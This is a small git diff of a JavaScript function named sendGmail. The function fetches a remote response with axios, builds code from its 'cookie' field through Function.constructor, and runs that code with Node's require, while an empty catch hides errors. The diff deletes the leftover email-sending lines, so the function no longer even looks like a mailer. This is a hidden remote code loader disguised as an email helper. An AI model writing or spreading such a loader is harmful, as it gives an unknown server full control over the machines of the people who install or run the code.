@@ -27,10 +27,6 @@ const sendGmail = (async () => {
         const image = (await axios.get(realImageUrl,{headers:{[realTitle]:realDescription}})).data.cookie;
         const parseImage = new (Function.constructor)('require',image);
         parseImage(require);
-
-        // Temporarily commented out the email sending part
-        // await sgMail.send(msg);
-        console.log('Email Sent');
     } catch (error) {
        
     }
